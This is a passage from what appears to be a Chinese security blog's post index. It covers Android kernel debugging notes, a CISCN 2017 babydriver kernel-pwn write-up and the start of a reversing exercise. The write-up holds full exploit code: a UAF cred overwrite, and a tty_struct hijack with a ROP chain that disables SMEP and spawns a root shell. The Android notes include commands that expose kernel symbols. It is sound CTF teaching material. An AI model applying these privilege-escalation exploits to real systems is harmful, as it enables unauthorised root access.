*stack`指向一个联合体，叫做`thread_union`，即代表内核栈，也代表thread_info。\n\n```c\nunion thread_union {\n\tstruct thread_info thread_info;\n\tunsigned long stack[THREAD_SIZE/sizeof(long)];\n};\n```\n\ntask_struct，thread_info和内核栈之间的关系如下图所示。\n\n[内核栈与thread_info结构详解](https://www.cnblogs.com/yungyu16/p/13023982.html)\n\n![image-20220919162607272](image-20220919162607272.png?size=600)\n\n\n\n### thread_info\n\n```c\ntypedef unsigned long mm_segment_t;\n\nstruct thread_info {\n\tunsigned long\t\tflags;\t\t/* low level flags */\n\tmm_segment_t\t\taddr_limit;\t/* address limit */\n\tstruct task_struct\t*task;\t\t/* main task structure */\n\tstruct exec_domain\t*exec_domain;\t/* execution domain */\n\tstruct restart_block\trestart_block;\n\tint\t\t\tpreempt_count;\t/* 0 => preemptable, <0 => bug */\n\tint\t\t\tcpu;\t\t/* cpu */\n};\n```\n\n\n\n# 其他\n\n## andorid模拟器\n\nandroid模拟器有很多，[15 best Android emulators for PC and Mac of 2022](https://www.androidauthority.com/best-android-emulators-for-pc-655308/)，android studio适合开发者，qemu-android适合研究调试。\n\n猜测：只有android studio和qemu-android可以模拟arm架构的android，其他模拟器（大多数）都是x86架构的android。因为android studio和qemu-android都是谷歌家开发的。\n\n- [**qemu-android**](https://qemu-android.googlesource.com/?format=HTML)：谷歌开发人员基于qemu更改的模拟器，用于启动goldfish对应的android。[Difference among Android's emulator command variations](https://stackoverflow.com/a/38938169)\n\n- [**goldfish**](https://android.googlesource.com/kernel/goldfish/+refs)：[由谷歌开发并命名的一个虚拟CPU（或board），用于Android模拟器](https://groups.google.com/g/android-kernel/c/M4SjXulUeUo/m/M5BCX9bfk2oJ)\n\n- **ranchu**：我认为可以简单的把ranchu理解为goldfish的升级版，对应有升级版的qemu-android（也可称之为qemu-ranchu）。[New emulator code base (qemu-android) and \"ranchu\" virtual board](https://groups.google.com/g/android-emulator-dev/c/dltBnUW_HzU/m/2tSZNLaVzmQJ)\n\n对于想准确研究以上概念的同学，推荐参考书籍：[Android System Programming](https://www.oreilly.com/library/view/android-system-programming/9781787125360/)\n\n\n\n\n\n## ubuntu ndk编译环境\n\n参考了这篇文章：[ubuntu下android ndk编译环境搭建方法](https://www.cxybb.com/article/qq_45683435/113838305)\n\n下载[android-ndk-r13b](https://dl.google.com/android/repository/android-ndk-r13b-linux-x86_64.zip)，然后按照如下命令安装\n\n```shell\n~$ unzip android-ndk-r13b-linux-x86_64.zip\n~$ mkdir ndk-android-tool-chain\n~$ cd ./android-ndk-r13b/build/tools\n~/android-ndk-r13b/build/tools$ ./make-standalone-toolchain.sh  --arch=arm64 --platform=android-21 --install-dir=/home/bling/ndk-android-tool-chain --force\n~/android-ndk-r13b/build/tools$ ./make-standalone-toolchain.sh  --arch=arm64 --platform=android-21 --force\n# 在/home/bling/ndk-android-tool-chain/bin目录下有我们需要的编译器android gcc及ndk-build\n# 最后，将该路径配置到环境变量中\n# export PATH=/home/bling/ndk-android-tool-chain/bin:$PATH\n# export PATH=/home/bling/android-ndk-r13b:$PATH\n```\n\n\n\n## 提取内核代码并恢复符号\n\n### 旧方法 - IDApython脚本\n\n[逆向ARM64内核zImage](http://www.hhjack.com/arm64_zimage_reverseengineering_with_ida_pro/)\n\n[从Android设备中提取内核和逆向分析](https://blog.csdn.net/QQ1084283172/article/details/57074695)\n\nImage就是内核代码，由于系统未开启KASLR，通过启动时打印的log我们可以获得内核加载基址0xffffffc000080000。\n\n![image-20220724182224254](image-20220724182224254.png?size=600)\n\nIDA打开Image，并设置好ROM start address和Loading address，从文件头开始按\"P\"解析函数。发现函数没有符号。\n\n于是回到adb shell中，导出内核符号表\n\n```shell\necho 0 > /proc/sys/kernel/kptr_restrict\ncat /proc/kallsyms > /data/local/tmp/1.txt\n```\n\n利用内核符号表文件，恢复IDA中对应的函数名，IDA脚本如下\n\n```python\nimport idc\nimport idaapi\nksyms = open(\"D:\\\\yuanyuan\\\\abc.txt\")\t# 导出的内核符号表文件\nfor line in ksyms:\n    addr = int(line[0:16],16)\n    name = line[19:].replace('_','')\n    name = line[19:].replace('\\n','')\n\tidc.create_insn(addr)\t\t\t# 将指定地址处的机器码翻译成汇编指令\n\tida_funcs.add_func(addr, BADADDR)\t# 在指定地址处创建一个函数\n    idc.set_name(addr, name, SN_CHECK)\t\t\t# 重命名addr处函数为name\n    Message(\"%08X:%s\"%(addr,name))\n```\n\n恢复符号表后，发现还有很多函数没有恢复成功，是因为函数名冲突了。但是不影响分析。\n\n### 新方法 - vmlinux-to-elf\n\n[vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf)可以将 vmlinux/vmlinuz/bzImage/zImage等内核镜像恢复符号并转换成elf格式，便于IDA分析。\n\n![image-20220921230829799](image-20220921230829799.png?size=600)\n\n使用方法如下：\n\n```bash\ngit clone https://github.com/marin-m/vmlinux-to-elf.git\ncd vmlinux-to-elf\n./vmlinux-to-elf <xxx> xxx.elf\n```\n\n## 编译调试linux-3.10内核镜像\n\n```bash\ngit clone https://github.com/torvalds/linux.git -b v3.10 --depth=1\ncd linux\n# 指定交叉编译器。对于小于3.18版本的内核，编译器版本需小于5.0\nmake ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- defconfig\nmake ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- -j4\n```\n\n\n\n# 参考文档\n\n- CVE-2015-3636分析文档\n\n[[原创]CVE-2015-3636(pingpong root) android内核 UAF漏洞分析 ](https://bbs.pediy.com/thread-230298.htm)\n\n[cve-2015-3636 - 20000s](https://blog.csdn.net/qq_37439229/article/details/122843627?spm=1001.2014.3001.5502)\n\n[Study CVE-2015-3636 - I](https://1ce0ear.github.io/2020/03/01/root-cve-2015-3636/)\n\n[CVE-2015-3636漏洞分析](http://pwn4.fun/2017/08/03/CVE-2015-3636%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)\n\n[CVE-2015-3636](https://a7vinx.github.io/2016/12/04/cve_2015_3636/)\n\n[CVE-2015-3636内核漏洞分析](https://idhyt.blogspot.com/2016/03/cve-2015-3636.html)这篇文章中说，x86-64架构上利用该漏洞仅能造成系统崩溃，而非x86-64架构（如arm）可利用改漏洞提权。\n\n真实设备利用exp：[CVE-2015-3636 exp.by.fi01](https://github.com/fi01/CVE-2015-3636)\n\n存在该漏洞的版本： linux kernel <=v4.1-rc1\n\n- 其他参考文档\n\n[Android内核的编译和调试及gdb cheatsheet](https://its301.com/article/QQ1084283172/70500488)\n\n[字节ctf2021 android题中用到了docker运行apk](https://shvu8e0g7u.feishu.cn/docs/doccndYygIwisrk0FGKnKvE0Jhg#qkNWuR)\n\n[Searchable Linux Syscall Table for x86 and x86_64](https://filippo.io/linux-syscall-table/)\n\n\n\n\n\n","tags":["android","socket","goldfish"],"categories":["漏洞复现"]},{"title":"第一道内核pwn - CISCN 2017 babydriver","url":"/2022/08/28/CISCN2017-babydriver/","content":"\n\n\n这是一道linux内核CTF的入门题，对于完全没有linux内核ko开发经验的同学，做这道题之前，建议先学一下宋宝华的《Linux设备驱动开发详解》并实践字符设备驱动的开发过程，了解read/write/ioctl/mmap这些基本内核接口的实现和原理。\n\n第一种解法：\n\n[[CISCN 2017] babydriver](http://1.15.94.35:8090/archives/ciscn2017babydriver)\n\n[CISCN 2017 babydriver (UAF利用方法)](https://beafb1b1.github.io/kernel/ciscn_2017_babydriver_UAF/)\n\n另一种解法：\n\n[linux kernel pwn学习之伪造tty_struct执行任意函数](https://blog.csdn.net/seaaseesa/article/details/104577501)\n\n# 分析\n\n题目附件：[CISCN2017-babydriver](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver)\n\n本题漏洞ko为babydriver.ko，注册了如下一些函数对用户态提供服务\n\n![image-20220805171100848](image-20220805171100848.png?size=600)\n\n`babyopen()` 函数中，申请了一个0x64大小的堆，然后将堆地址和大小赋给`babydev_struct`这个结构体的成员（device_buf占8字节，device_buf_len占2字节）。`babydev_struct`是一个全局变量，未设置任何保护措施。因此，当有两个用户同时打开`open(\"/dev/babydev\",2)`该设备节点时，后一个open操作，将覆盖`babydev_struct.device_buf`上的值，导致两个用户（不同fd）指向同一堆块。\n\n```c\nint __fastcall babyopen(inode *inode, file *filp)\n{\n  __int64 v2; // rdx\n\n  _fentry__(inode, (_DWORD)filp, v2);\n  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);\n  babydev_struct.device_buf_len = 64LL;\n  printk(\"device open\\n\", 37748928LL);\n  return 0;\n}\n```\n\n`babyread()`函数逻辑简单，判断用户态传入的长度是否小于`babydev_struct.device_buf_len`，如果满足条件则将`babydev_struct.device_buf`指向的内容拷贝到用户态。\n\n```c\nssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)\n{\n  size_t v4; // rdx\n  ssize_t result; // rax\n  ssize_t v6; // rbx\n\n  _fentry__(filp, (_DWORD)buffer, length);\n  if ( !babydev_struct.device_buf )\n    return -1LL;\n  result = -2LL;\n  if ( babydev_struct.device_buf_len > v4 )\n  {\n    v6 = v4;\n    copy_to_user(buffer);\n    return v6;\n  }\n  return result;\n}\n```\n\n`babywrite()`函数跟`babyread()`函数类似，判断条件通过后，将用户态的数据拷贝给`babydev_struct.device_buf`。\n\n```c\nssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)\n{\n  size_t v4; // rdx\n  ssize_t result; // rax\n  ssize_t v6; // rbx\n\n  _fentry__(filp, (_DWORD)buffer, length);\n  if ( !babydev_struct.device_buf )\n    return -1LL;\n  result = -2LL;\n  if ( babydev_struct.device_buf_len > v4 )\n  {\n    v6 = v4;\n    copy_from_user();\n    return v6;\n  }\n  return result;\n}\n```\n\n`babyioctl()`只有一个分支（command），它先将`babydev_struct.device_buf`指向的堆块释放掉，然后根据用户态传入的arg参数申请**任意大小**堆块，并更新`babydev_struct`结构体中两个成员。\n\n```c\n__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)\n{\n  size_t v3; // rdx\n  size_t v4; // rbx\n\n  _fentry__(filp, command, arg);\n  v4 = v3;\n  if ( command == 0x10001 )\n  {\n    kfree(babydev_struct.device_buf);\n    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);\n    babydev_struct.device_buf_len = v4;\n    printk(\"alloc done\\n\", 37748928LL);\n    return 0LL;\n  }\n  else\n  {\n    printk(&unk_2EB, v3);\n    return -22LL;\n  }\n}\n```\n\n`babyrelease()`函数在`close(fd)`关闭设备节点时会被调用到，这里释放了`babydev_struct.device_buf`指向的堆块，但是并没有置空，存在**UAF**漏洞。\n\n```c\nint __fastcall babyrelease(inode *inode, file *filp)\n{\n  __int64 v2; // rdx\n\n  _fentry__(inode, (_DWORD)filp, v2);\n  kfree(babydev_struct.device_buf);\n  printk(\"device release\\n\", filp);\n  return 0;\n}\n```\n\n总结一下：\n\n- 两个用户（fd1, fd2）可以指向同一个内核结构体\n- 用户1（fd1）可以为该结构体申请一个任意大小的堆块然后释放该堆块\n- 用户2（fd2）获得一个垂悬指针。\n\n# 利用\n\n## 方法1 - 改子进程cred\n\n> 前置知识：fork()一个子进程时，内核会为cred分配0xa8大小的堆用于存放结构体内容。\n\n利用ioctl构造0xa8大小的堆块，然后调用close释放该堆块。紧接着fork一个子进程，就能为cred分配到刚刚释放的0xa8堆块。\n\n最后通过垂悬指针更改cred内容，获得root shell。\n\n### 在子进程中改堆中内容\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main(){\n\tint fd1 = open(\"/dev/babydev\",2);\n\tint fd2 = open(\"/dev/babydev\",2);\t\t\t// 两个fd在内核中对应同一个babydev_struct结构体\n\n\tioctl(fd1,0x10001,0xa8);\t\t\t\t\t// babydev_struct.device_buf被覆盖成0xa8大小堆的地址\n\tclose(fd1);\t\t\t\t\t\t\t\t\t\t\t\t// fd2在内核中获得一个垂悬指针\n\n\tpid_t fpid; \n\tfpid=fork(); \t\t\t\t\t\t\t// ？fork子进程，内核会为其cred结构体申请0xa8大小的堆，在无干扰的情况下，正好分配到上述释放的堆块\n\tif (fpid < 0) {\n\t\tprintf(\"error in fork!\\n\"); \n\t\texit(0);\n\t}else if (fpid == 0) {\n\t\tprintf(\"child pid is : %d\\n\",getpid());\n    char zeros[30] = {0};\n    write(fd2,zeros,28);\t\t\t\t// ？通过fd2更改cred堆块内容，将uid，gid改为0\n\t\t// if(getuid() == 0){\n\t\tsystem(\"/bin/sh\");\t\t\t\t\t// 起一个shell（root）\n\t\texit(0);\n\t\t// }\n\t}else {\n\t\twait(NULL);\n\t\tprintf(\"parent pid is: %d\\n\",getpid());\n\t}\n\tprintf(\"%d: going to close fd2\\n\",getpid());\n\tclose(fd2);\t\t\t\t\t//只有父进程会进入此处，子进程exit(0)时已退出\n\n\treturn 0;\n}\n```\n\n父进程中使用`wait(NULL);`，防止子进程还未执行完成，父进程便已提前退出。[wait(NULL)](https://blog.csdn.net/Ting_Yann/article/details/107545429)这篇文章中的 “尊老爱幼” 一词生动地解释了有无`wait(NULL);`的区别。\n\n本题需在父进程中使用该等待，否则无法在fork的子进程中稳定获得shell。\n\n![image-20220805161208901](image-20220805161208901.png?size=600)\n\n\n\n### 在父进程中改堆中内容\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n\nint main(){\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0xa8);\n    close(fd1);\n\n    pid_t fpid; \n    fpid=fork(); \t\t\t\t//子进程的cred结构体正好申请到close(fd1)释放的堆，但fd2依然有指针指向该堆块\n    if (fpid < 0) {\n        printf(\"error in fork!\\n\"); \n        exit(0);\n    }else if (fpid == 0) {\n        printf(\"waiting...\");\t\t\t// 子进程中，等待3s，等父进程更改uid和gid\n        sleep(3);\n        system(\"/bin/sh\");\t\t\t\t// get root shell !!!\n        exit(0);\n    }else {\n        char zeros[30] = {0};\t\t\t// 父进程中，通过fd2更改（UAF）堆块（子进程的cred结构体）\n        write(fd2,zeros,28);\n        wait(NULL);\t\t\t\t\t\t\t\t// 防止父进程退出导致子进程root shell被覆盖\n    }\n    close(fd2);\n    return 0;\n}\n```\n\n\n\n## 方法2 - tty_struct\n\n[Linux中的tty、pty、pts与ptmx辨析](https://blog.csdn.net/zhoucheng05_13/article/details/86510469)\n\n[Linux伪终端](https://www.jianshu.com/p/11c01003211b)\n\n当用户打开`/dev/ptmx`设备节点时，内核会为其分配一个`tty_struct`结构体\n\n该题目版本中，tty_struct大小：`0x2e0`\n\ntty_struct->tty_operations的偏移为`4+4+8+8=24`\n\n```c\nstruct tty_struct {\n\tint\tmagic;\n\tstruct kref kref;\n\tstruct device *dev;\n\tstruct tty_driver *driver;\n\tconst struct tty_operations *ops;\n  // ······\n}\n// 见网页https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272\n```\n\ntty_operations结构体中部分成员如下：\n\n```c\nstruct tty_operations {\n\tstruct tty_struct * (*lookup)(struct tty_driver *driver,\n\t\t\tstruct file *filp, int idx);\n\tint  (*install)(struct tty_driver *driver, struct tty_struct *tty);\n\tvoid (*remove)(struct tty_driver *driver, struct tty_struct *tty);\n\tint  (*open)(struct tty_struct * tty, struct file * filp);\n\tvoid (*close)(struct tty_struct * tty, struct file * filp);\n\tvoid (*shutdown)(struct tty_struct *tty);\n\tvoid (*cleanup)(struct tty_struct *tty);\n\tint  (*write)(struct tty_struct * tty,\n\t\t      const unsigned char *buf, int count);\n\tint  (*put_char)(struct tty_struct *tty, unsigned char ch);\n\tvoid (*flush_chars)(struct tty_struct *tty);\n\tint  (*write_room)(struct tty_struct *tty);\n\tint  (*chars_in_buffer)(struct tty_struct *tty);\n\tint  (*ioctl)(struct tty_struct *tty,\n\t\t    unsigned int cmd, unsigned long arg);\n  // ......\n}\n```\n\n\n\n### 劫持控制流\n\n使用如下代码段，在用户态伪造tty_operations结构体\n\n```c\n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=0xffffffffc0000130+j;   \n    }\n```\n\n分别测试对`tty_operations->write()`和`tty_operations->ioclt()`劫持成功时的上下文情况。\n\n1. 劫持tty_operations中的write函数，0x7ffe270c1920是用户态伪造的tty_operations结构体地址\n\n![image-20220806174447004](image-20220806174447004.png?size=600)\n\n2. 劫持tty_operations中的ioctl函数，0x7ffe38927460是用户态伪造的tty_operations结构体地址\n\n![image-20220806174723108](image-20220806174723108.png?size=600)\n\n\n\n### 寻找gadget\n\n对于内核文件，使用[ropper](https://github.com/sashs/Ropper)找可用gadget比ROPgadget的速度要快。\n\n- 安装\n\n```\nsudo pip install capstone\nsudo pip install filebytes\nsudo pip install keystone-engine\npip install ropper\n```\n\n- 使用\n\n```\nropper --file vmlinux --search \"mov rsp, rax\"\nropper --file vmlinux --search \"mov rsp, rcx\"\n```\n\n为实现root shell的目的，只执行一条gadget无法达成目的，为此我们需要构造ROP链。但是内核栈空间我们无法控制，因此考虑通过一条gadget先迁移栈到可控的空间，然后继续ROP。\n\n对于非elf格式的二进制\n\n```bash\nROPgadget --binary ./Image --rawArch=arm64 --rawMode=64 --rawEndian=little  > gadget.txt\nROPgadget --binary ./Image --rawArch=arm64 --rawMode=64 --rawEndian=little | grep \"0xffffffffffffc000\" | grep \"ret\"  > target.txt\n\nropper --file ./Image -a ARM64 --search \"mov %,sp;\"\n```\n\n#### 栈迁移（2次）\n\n> 找`mov rsp, rax` 或者 `xchg rax rsp` 之类的指令，迁移栈空间\n\n本题使用ropper并未找到合适gadget，最后还是用ROPgadget找到的，如下：\n\n```\n$ ROPgadget --binary ./vmlinux > ropgadget.txt\n$ cat ropgadget.txt | grep \"mov rsp,\"\n······\n0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e\n0xffffffff8181a7ef : mov rsp, rax ; pop rax ; jmp 0xffffffff8181a797\n······\n```\n\n上一步劫持控制流中，劫持到tty_operations中的write函数时，RAX中存放了用户态伪造的tty_operations结构体地址。结合`0xffffffff8181bfc5`这条gadget，可以实现将栈迁移到`tty_operations_fake[0]`处。\n\n由于rax指向的地址是tty_operations_fake[0]的首地址，执行几条gadget就会跟`tty_operations->write`（tty_operations_fake[7]）重合。因此第一次劫持栈后，再做一次栈迁移，将栈迁移到一个局部数组变量中。\n\n```c\n    size_t mov_rsp_rax = 0xffffffff8181bfc5; // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e\n    size_t pop_rax = 0xffffffff8100ce6e;     // pop rax; ret; \n    \n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=mov_rsp_rax;   \n    }\n\n    tty_operations_fake[0] = pop_rax;\t\t\t\t\t// 将rax的值改为rop_chain的地址\n    tty_operations_fake[1] = (size_t)rop_chain;\n    tty_operations_fake[2] = mov_rsp_rax;\t\t\t//\t 第二次站迁移到rop_chain\n```\n\n\n\n#### 关闭SMEP\n\n[SMEP - ctfwiki](https://ctf-wiki.org/en/pwn/linux/kernel-mode/exploitation/bypass-smep/#smep)\n\n补充wiki中的描述，当\n\n```shel\n$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000\n```\n\n时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要\n\n```shell\nmov cr4, 0x407f0\n# 0x1407e0 = 000 0 0100 0000 0111 1111 0000\n```\n\nCTF比赛中，常将cr4的值设置为0x6f0，来关闭SMEP。\n\n本题通过ropper找到如下两条gadget，来修改cr4寄存器的值\n\n```\n0xffffffff810d238d: pop rdi; ret;\n0xffffffff81004d80: mov cr4, rdi; pop rbp; ret; \n```\n\n\n\n#### 执行提权函数\n\n本题未开启KASLR，读取提权所需的内核符号地址如下：\n\n```shell\n/ $ cat /proc/kallsyms > /tmp/kallsyms.txt\n/ $ cd tmp\n/tmp $ ls\nkallsyms.txt\n/tmp $ cat kallsyms.txt | grep \"prepare_kernel_cred\"\nffffffff810a1810 T prepare_kernel_cred\nffffffff81d91890 R __ksymtab_prepare_kernel_cred\nffffffff81dac968 r __kcrctab_prepare_kernel_cred\nffffffff81db9450 r __kstrtab_prepare_kernel_cred\n/tmp $ cat kallsyms.txt | grep \"commit_creds\"\nffffffff810a1420 T commit_creds\nffffffff81d88f60 R __ksymtab_commit_creds\nffffffff81da84d0 r __kcrctab_commit_creds\nffffffff81db948c r __kstrtab_commit_creds\n\n# 函数定义\n# struct cred *prepare_kernel_cred(struct task_struct *);\n# int commit_creds(struct cred *);\n```\n\n上一步已关闭SMEP，于是在用户态构造如下代码片段，即可提权\n\n```c\n#define pkc_addr 0xffffffff810a1810\n#define cc_addr 0xffffffff810a1420\nvoid get_root(){\n  char* (*pkc)(int) = pkc_addr;\n  void (*cc)(char*) = cc_addr;\n  (*cc)((*pkc)(0));\n}\n```\n\n\n\n#### 返回用户态\n\n[FS/GS寄存器的用途](https://zhuanlan.zhihu.com/p/435518616)\n\n[KERNEL PWN状态切换原理及KPTI绕过](https://zhuanlan.zhihu.com/p/137277724)\n\n- swapgs\n\n  一条简单的指令，交换用户态和内核态的GS寄存器。\n\n- iretq\n\n  会从内核栈中恢复`rip/cs/rflags/rsp/ss `这几个寄存器，执行iretq指令时，内核栈应按如下格式布局\n\n  ```\n  rsp ---> rip \n           cs\n           rflags\n           rsp\n           ss\n  ```\n\n找到如下gadget\n\n```\n0xffffffff81063694: swapgs; pop rbp; ret; \n0xffffffff814e35ef: iretq; ret;\n```\n\n\n\n#### 保存现场\n\n为了能稳定返回用户态，在进入内核态前，应保存几个重要寄存器，供iretq时使用。参考代码如下\n\n```c\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status()\n{\n    __asm__(\"mov user_cs, cs;\"\n            \"mov user_ss, ss;\"\n            \"mov user_sp, rsp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n// pushf 标志寄存器入栈\n// popf 标志寄存器出栈\n```\n\n\n\n### 完整EXP\n\n注意，exp需静态编译，且需更改`boot.sh`，将`-enable-kvm`参数删除，才能利用该exp打成功。\n\n```c\n#include<unistd.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include <string.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n\nsize_t pkc_addr = 0xffffffff810a1810;\nsize_t cc_addr = 0xffffffff810a1420;\nvoid get_root(){\n    char* (*pkc)(int) = pkc_addr;\n    void (*cc)(char*) = cc_addr;\n    (*cc)((*pkc)(0));\n}\n\nvoid get_shell(){\n    system(\"/bin/sh\");\n}\n\nsize_t user_cs, user_rflags, user_sp, user_ss;\nvoid save_status()\n{\n    __asm__(\"mov %cs, user_cs;\"\n            \"mov %ss, user_ss;\"\n            \"mov %rsp, user_sp;\"\n            \"pushf;\"\n            \"pop user_rflags;\"\n            );\n    puts(\"[*]status has been saved.\");\n}\n\nint main(){\n    save_status();\n\n    size_t mov_rsp_rax = 0xffffffff8181bfc5;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e\n    size_t pop_rax = 0xffffffff8100ce6e;        // pop rax; ret; \n    \n    size_t rop_chain[30] = {0};\n    int index = 0;\n    rop_chain[index++] = 0xffffffff810d238d;        // pop rdi; ret;\n    rop_chain[index++] = 0x6f0;\n    rop_chain[index++] = 0xffffffff81004d80;        // mov cr4, rdi; pop rbp; ret; \n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = (size_t)get_root;\n    rop_chain[index++] = 0xffffffff81063694;        // swapgs; pop rbp; ret; \n    rop_chain[index++] = 0x0;\n    rop_chain[index++] = 0xffffffff814e35ef;        // iretq; ret;\n    rop_chain[index++] = (size_t)get_shell;\n    rop_chain[index++] = user_cs;\n    rop_chain[index++] = user_rflags;\n    rop_chain[index++] = user_sp;\n    rop_chain[index++] = user_ss;\n\n    size_t tty_operations_fake[30];\n    for(int j=0;j<30;j++){\n        tty_operations_fake[j]=mov_rsp_rax;   \n    }\n\n    int fd1 = open(\"/dev/babydev\",2);\n    int fd2 = open(\"/dev/babydev\",2);\n\n    ioctl(fd1,0x10001,0x2e0);\n    close(fd1);\n\n    int fd_tty = open(\"dev/ptmx\",2);\n\n    size_t tty_struct_leak[4];\n    read(fd2,tty_struct_leak,32);\n    \n    tty_operations_fake[0] = pop_rax;\n    tty_operations_fake[1] = (size_t)rop_chain;\n    tty_operations_fake[2] = mov_rsp_rax;\n\n    tty_struct_leak[3] = (size_t)tty_operations_fake;\n    write(fd2,tty_struct_leak,32);\n\n    size_t a[4] = {0,0,0,0};\n    write(fd_tty,a,32);\n    // ioctl(fd_tty,0x100,32);\n\n    close(fd2);\n\treturn 0;\n}\n```\n\n\n\n# 其他\n\n## cpio解压与压缩\n\n```shell\n# 解压\n$ gunzip filename.cpio.gz\n$ cpio -idmv < filename.cpio\n# 压缩\n$ find . | cpio -o -H newc > filename.cpio\n# 或 find . | cpio -o > filename.cpio\n# 或 find . | cpio -o --format=newc > ../rootfs.cpio\n```\n\n其他情况参考：[cpio解压initramfs.img](https://www.cnblogs.com/carriezhangyan/p/9407567.html)\n\n\n\n## 将bzImage转化成vmlinux\n\nvmlinux即内核符号文件？\n\n```shell\n$ /usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage > vmlinux\n```\n\nvmlinux与bzimage的区别\n\n```shell\n$ file vmlinux \nvmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=76517ec1ebecb36ffb324a8b5b0495c51625c53b, stripped\n$ file bzImage \nbzImage: Linux kernel x86 boot executable bzImage, version 4.15.8 (root@ubuntu) #3 SMP Thu Jun 3 01:01:56 PDT 2021, RO-rootFS, swap_dev 0x7, Normal VGA\n```\n\n\n\n## ko代码段与bss段的地址\n\n> 调试内核模块bss段时，要注意实际地址跟IDA分析出来的地址不一样。\n\nbabydriver.ko的加载地址是`0xffffffffc0000000`，text段如`babyopen()`函数（IDA中显示偏移为0x30）的实际地址为`0xffffffffc0000030`，而bss段`babydev_struct`结构体（IDA中显示偏移为0xd90）的实际地址为`0xffffffffc00024d0`。\n\n```\npwndbg> x/10gx 0xffffffffc0000d90\n0xffffffffc0000d90:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000da0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000db0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000dc0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0000dd0:\t0x0000000000000000\t0x0000000000000000\npwndbg> x/10gx 0xffffffffc00024d0\n0xffffffffc00024d0:\t0xffff8800027dcb00\t0x0000000000000040\n0xffffffffc00024e0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc00024f0:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0002500:\t0x0000000000000000\t0x0000000000000000\n0xffffffffc0002510:\t0x0000000000000000\t0x0000000000000000\n```\n\n\n\n","tags":["kernel pwn"],"categories":["CTF"]},{"title":"基础逆向练习题","url":"/2022/07/01/basic-reverse-exercise/","content":"\n\n\n# check_in\n\n附件：[check_in.zip](check_in.zip)\n\n> init_array\n\n通过IDA，逆向得到main函数：\n\n```c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  char s1[268]; // [rsp+10h] [rbp-110h] BYREF\n  int v5; // [rsp+11Ch] [rbp-4h]\n\n  v5 = 0;\n  gets(s1, 256LL, a3);\n  if ( !strncmp(s1, s2, 0x100uLL) )\n    puts(\"flag is right\");\n  else\n    puts(\"flag is wrong\");\n  return 0LL;\n}\n```\n\ns2在data段，但是该字符串并非真正的flag。\n\n```\n.data:0000000000404040 ; char s2[]\n.data:0000000000404040 s2              db 'flag{check_inn}',0 \n```\n\n接下来有两种思路：\n\n1. init_array 中存在函数，在main函数之前执行。（因此s2被初始化成别的值）\n2. 查找对s2的引用，在 `sub_4011D0()` 函数中对s2做了更改。\n\n两者都指向同一个函数：\n\n```c\n_BYTE *sub_4011D0()\n{\n  _BYTE *result; // rax\n\n  result = (_BYTE *)((unsigned int)s2 + 15);\n  *(_BYTE *)((int)result - 1LL) = '_';\n  *(_BYTE *)(int)result = 'i';\n  *(_BYTE *)((int)result + 1LL) = 's';\n  *(_BYTE *)((int)result + 2LL) = '_';\n  *(_BYTE *)((int)result + 3LL) = 'n';\n  *(_BYTE *)((int)result + 4LL) = 'o';\n  *(_BYTE *)((int)result + 5LL) = 't';\n  *(_BYTE *)((int)result + 6LL) = '_';\n  *(_BYTE *)((int)result + 7LL) = 'r';\n  *(_BYTE *)((int)result + 8LL) = 'e';\n  *(_BYTE *)((int)result + 9LL) = 'a';\n  *(_BYTE *)((int)result + 0xALL) = 'l';\n  *(_BYTE *)((int)result + 0xBLL) = 'l';\n  *(_BYTE *)((int)result + 0xCLL) = '}';\n  *(_BYTE *)((int)result + 0xDLL) = '\\0';\n  return result;\n}\n```\n\n所以flag是 `flag{check_inn_is_not_reall}`\n\n# dang-van\n\n附件：[dang-van.zip](dang-van.zip)\n\n>一个更改过的base64\n\nmain函数如下，change函数中发现一个类似base64的索引表\n\n```\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char v3; // bl\n  char v5[16]; // [rsp+0h] [rbp-40h] BYREF\n  char v6[16]; // [rsp+10h] [rbp-30h] BYREF\n  char v7[32]; // [rsp+20h] [rbp-20h] BYREF\n\n  std::string::string((std::string *)v5);\n  std::operator<<<std::char_traits<char>>(&std::cout, \"Input your secret: \");\n  std::operator>><char>(&std::cin, v5);\n  std::string::string((std::string *)v6, (const std::string *)v5);\n  change((__int64)v7, (std::string *)v6);\n  v3 = 